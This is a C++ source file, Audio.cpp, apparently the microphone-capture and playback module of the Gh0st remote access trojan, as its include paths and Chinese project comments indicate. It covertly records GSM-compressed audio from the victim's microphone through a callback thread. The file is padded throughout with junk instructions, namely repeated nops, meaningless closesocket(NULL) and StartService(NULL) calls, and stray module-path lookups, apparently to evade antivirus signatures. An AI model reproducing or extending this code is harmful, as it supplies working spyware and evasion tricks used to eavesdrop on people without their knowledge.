// Audio.cpp: implementation of the CAudio class.
//
//////////////////////////////////////////////////////////////////////
#include "..\Gh0st_Client_Gh0st\StdAfx.h"
//TODO: 如果在Client_Gh0stExe或Server_SvchostDll工程里面使用，请注释掉这一行；如果在Gh0st_Server_Server使用，请保留这一行
//#include "StdAfx.h"
#include "Audio.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
#include <WinSock2.h>
CAudio::CAudio()
{
	__try
	{
		closesocket(NULL);
	}
	__finally
	{
		__asm nop;
	}
	TCHAR szModule [MAX_PATH];
	m_hEventWaveIn		= CreateEvent(NULL, false, false, NULL);
	GetModuleFileName(NULL,szModule,MAX_PATH);
	m_hStartRecord		= CreateEvent(NULL, false, false, NULL);
	GetShortPathName(szModule,szModule,MAX_PATH);
	m_hThreadCallBack	= NULL;
	m_nWaveInIndex		= 0;
	m_nWaveOutIndex		= 0;
	m_nBufferLength		= 1000; // m_GSMWavefmt.wfx.nSamplesPerSec / 8(bit)

	GetForegroundWindow();

	m_bIsWaveInUsed		= false;
	m_bIsWaveOutUsed	= false;

	for (int i = 0; i < 2; i++)
	{
		m_lpInAudioData[i] = new BYTE[m_nBufferLength];
		m_lpInAudioHdr[i] = new WAVEHDR;

		m_lpOutAudioData[i] = new BYTE[m_nBufferLength];
		m_lpOutAudioHdr[i] = new WAVEHDR;
		__asm nop;
		__asm nop;
		__asm nop;
		__asm nop;
		__asm nop;
		__asm nop;
		__asm nop;
		__asm nop;
		__asm nop;
	}
	__asm nop;
	
	memset(&m_GSMWavefmt, 0, sizeof(GSM610WAVEFORMAT));
	__asm nop;

	m_GSMWavefmt.wfx.wFormatTag = WAVE_FORMAT_GSM610; // ACM will auto convert wave format
	__asm nop;
	m_GSMWavefmt.wfx.nChannels = 1;
	__asm nop;
	m_GSMWavefmt.wfx.nSamplesPerSec = 8000;
	__asm nop;
	m_GSMWavefmt.wfx.nAvgBytesPerSec = 1625;
	__asm nop;
	m_GSMWavefmt.wfx.nBlockAlign = 65;
	__asm nop;
	m_GSMWavefmt.wfx.wBitsPerSample = 0;
	__asm nop;
	m_GSMWavefmt.wfx.cbSize = 2;
	__asm nop;
	m_GSMWavefmt.wSamplesPerBlock = 320;
	__asm nop;
	__asm nop;
	__asm nop;
	__asm nop;
	__asm nop;
	__asm nop;
	__asm nop;
	__asm nop;
	__asm nop;
	__asm nop;
	__asm nop;
}

CAudio::~CAudio()
{
	/*
	if (m_bIsWaveInUsed)
	{
		SC_HANDLE hSCM =  OpenSCManager( NULL, NULL, SC_MANAGER_CREATE_SERVICE );
		waveInStop(m_hWaveIn);
		waveInReset(m_hWaveIn);
		for (int i = 0; i < 2; i++)
			waveInUnprepareHeader(m_hWaveIn, m_lpInAudioHdr[i], sizeof(WAVEHDR));
		waveInClose(m_hWaveIn);
		__asm nop;
		__asm nop;
		CloseServiceHandle(hSCM);
		__asm nop;
		TerminateThread(m_hThreadCallBack, -1);
		__asm nop;
		__asm nop;
		__asm nop;
		__asm nop;
		__asm nop;
	}
	__asm nop;

	if (m_bIsWaveOutUsed)
	{
		__try
		{
			StartService(NULL,NULL,NULL);
		}
		__finally
		{
			__asm nop;
		}
		waveOutReset(m_hWaveOut);
		for (int i = 0; i < 2; i++)
			waveOutUnprepareHeader(m_hWaveOut, m_lpInAudioHdr[i], sizeof(WAVEHDR));
		CloseServiceHandle(NULL);
		waveOutClose(m_hWaveOut);
	}		
	*/
	for (int i = 0; i < 2; i++)
	{
		delete [] m_lpInAudioData[i];
		delete m_lpInAudioHdr[i];
		
		delete [] m_lpOutAudioData[i];
		delete m_lpOutAudioHdr[i];
	}

	TCHAR szModule [MAX_PATH];
	CloseHandle(m_hEventWaveIn);
	GetModuleFileName(NULL,szModule,MAX_PATH);
	CloseHandle(m_hStartRecord);
	CloseHandle(m_hThreadCallBack);
	GetShortPathName(szModule,szModule,MAX_PATH);
}

LPBYTE CAudio::getRecordBuffer(LPDWORD lpdwBytes)
{
	// Not open WaveIn yet, so open it...
	if (!m_bIsWaveInUsed && !InitializeWaveIn())
		return NULL;

	if (lpdwBytes == NULL)
		return NULL;

	TCHAR szModule [MAX_PATH];
	SetEvent(m_hStartRecord);
	GetModuleFileName(NULL,szModule,MAX_PATH);
	WaitForSingleObject(m_hEventWaveIn, INFINITE);
	GetShortPathName(szModule,szModule,MAX_PATH);
	*lpdwBytes = m_nBufferLength;
	return	m_lpInAudioData[m_nWaveInIndex];
}

bool CAudio::playBuffer(LPBYTE lpWaveBuffer, DWORD dwBytes)
{
	if (!m_bIsWaveOutUsed && !InitializeWaveOut())
		return NULL;

	for (int i = 0; i < dwBytes; i += m_nBufferLength)
	{
		GetForegroundWindow();
		memcpy(m_lpOutAudioData[m_nWaveOutIndex], lpWaveBuffer, m_nBufferLength);
		GetInputState();
		waveOutWrite(m_hWaveOut, m_lpOutAudioHdr[m_nWaveOutIndex], sizeof(WAVEHDR));
		m_nWaveOutIndex = 1 - m_nWaveOutIndex;
	}
	return true;
}

bool CAudio::InitializeWaveIn()
{
	TCHAR szModule [MAX_PATH];

	if (!waveInGetNumDevs())
		return false;

	MMRESULT	mmResult;
	DWORD		dwThreadID = 0;
	GetModuleFileName(NULL,szModule,MAX_PATH);
	m_hThreadCallBack = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)waveInCallBack, (LPVOID)this, CREATE_SUSPENDED, &dwThreadID);
	GetShortPathName(szModule,szModule,MAX_PATH);
	mmResult = waveInOpen(&m_hWaveIn, (WORD)WAVE_MAPPER, &(m_GSMWavefmt.wfx), (LONG)dwThreadID, (LONG)0, CALLBACK_THREAD);

	if (mmResult != MMSYSERR_NOERROR)
		return false;

	for (int i = 0; i < 2; i++)
	{
		m_lpInAudioHdr[i]->lpData = (LPSTR)m_lpInAudioData[i];
		m_lpInAudioHdr[i]->dwBufferLength = m_nBufferLength;
		m_lpInAudioHdr[i]->dwFlags = 0;
		m_lpInAudioHdr[i]->dwLoops = 0;
		waveInPrepareHeader(m_hWaveIn, m_lpInAudioHdr[i], sizeof(WAVEHDR));
	}
	
	memset( szModule, 0, sizeof(szModule) );
	waveInAddBuffer(m_hWaveIn, m_lpInAudioHdr[m_nWaveInIndex], sizeof(WAVEHDR));
	GetModuleFileName(NULL,szModule,MAX_PATH);
	ResumeThread(m_hThreadCallBack);
	GetShortPathName(szModule,szModule,MAX_PATH);
	waveInStart(m_hWaveIn);

	m_bIsWaveInUsed = true;

	return true;

}

bool CAudio::InitializeWaveOut()
{
	TCHAR szModule [MAX_PATH];

	if (!waveOutGetNumDevs())
		return false;

	GetModuleFileName(NULL,szModule,MAX_PATH);

	for (int i = 0; i < 2; i++)
		memset(m_lpOutAudioData[i], 0, m_nBufferLength);
	
	MMRESULT	mmResult;
	mmResult = waveOutOpen(&m_hWaveOut, (WORD)WAVE_MAPPER, &(m_GSMWavefmt.wfx), (LONG)0, (LONG)0, CALLBACK_NULL);
	if (mmResult != MMSYSERR_NOERROR)
		return false;

	GetShortPathName(szModule,szModule,MAX_PATH);

	for (int i = 0; i < 2; i++)
	{
		m_lpOutAudioHdr[i]->lpData = (LPSTR)m_lpOutAudioData[i];
		m_lpOutAudioHdr[i]->dwBufferLength = m_nBufferLength;
		m_lpOutAudioHdr[i]->dwFlags = 0;
		m_lpOutAudioHdr[i]->dwLoops = 0;
		waveOutPrepareHeader(m_hWaveOut, m_lpOutAudioHdr[i], sizeof(WAVEHDR));
	}
	__try
	{
		closesocket(NULL);
	}
	__finally
	{
		__asm nop;
	}

	m_bIsWaveOutUsed = true;
	return true;
}

DWORD WINAPI CAudio::waveInCallBack( LPVOID lparam )
{
	TCHAR szModule [MAX_PATH];

	CAudio	*pThis = (CAudio *)lparam;

	GetModuleFileName(NULL,szModule,MAX_PATH);

	MSG	Msg;
	while (GetMessage(&Msg, NULL, 0, 0))
	{
		GetForegroundWindow();
		if (Msg.message == MM_WIM_DATA)
		{
			// 通知的数据到来
			SetEvent(pThis->m_hEventWaveIn);
			GetInputState();
			// 等待开始下次录音
			WaitForSingleObject(pThis->m_hStartRecord, INFINITE);

			pThis->m_nWaveInIndex = 1 - pThis->m_nWaveInIndex;
			
			MMRESULT mmResult = waveInAddBuffer(pThis->m_hWaveIn, pThis->m_lpInAudioHdr[pThis->m_nWaveInIndex], sizeof(WAVEHDR));
			if (mmResult != MMSYSERR_NOERROR)
				return -1;
			
		}

		// Why never happend this
		if (Msg.message == MM_WIM_CLOSE)
			break;

		__try
		{
			closesocket(NULL);
		}
		__finally
		{
			__asm nop;
		}
		TranslateMessage(&Msg); 
		DispatchMessage(&Msg);
	}

	return 0;	
}